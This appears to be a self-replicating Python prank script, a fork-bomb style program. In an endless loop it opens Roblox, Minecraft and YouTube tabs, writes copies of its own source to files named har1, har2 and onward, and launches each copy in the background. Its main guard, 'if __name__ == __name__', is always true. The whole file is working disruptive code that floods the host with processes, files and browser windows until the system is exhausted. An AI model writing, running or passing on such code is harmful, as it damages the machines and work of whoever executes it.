import webbrowser as wb
import os
import time

wbarray = [
    'https://www.youtube.com/watch?v=H3_zxK4zb8M',
    'https://www.youtube.com/watch?v=r9aVszSJCnc',
    'https://www.youtube.com/watch?v=Y9wXfdjDzrA'
]

def run_links():
    wb.open_new('https://www.minecraft.net/download')
    for link in wbarray:
       wb.open_new_tab(link)

def getnewfilename(filename):
    num = ''
    for char in filename[::-1]:
        if char in '1234567890':
            num = char + num
    num1 = (int(num) * 2) if len(num) > 0 else num
    num2 = (int(num) * 2) + 1 if len(num) > 0 else num
    num1, num2 = str(num1), str(num2)
    fname0 = 'har' + ('1' if num1 == '' else num1)
    fname1 = 'har' + ('2' if num2 == '' else num2)
    return [fname0, fname1]

def everything():
    print("Hello, Dave.")
    run_links()
    
    filename, fileext = os.path.splitext(os.path.basename(__file__))
    directory = os.path.dirname(os.path.abspath(__file__))
    
    fnames = getnewfilename(filename)

    if (len(fnames[0]) > 250 or len(fnames[1]) > 250):
        print('resetting')
        fnames[0] = 'har1'
        fnames[1] = 'har2'

    with open(os.path.join(directory, filename+fileext)) as reader:
        for fname in fnames:
            with open(os.path.join(directory, fname+fileext), 'w+') as writer:
                writer.write(reader.read())
            os.system('python {}{} &'.format(os.path.join(directory, fname), fileext))

if __name__ == __name__:
	wb.open_new('https://www.roblox.com/')
	while 1:
		time.sleep(.2)
		everything()
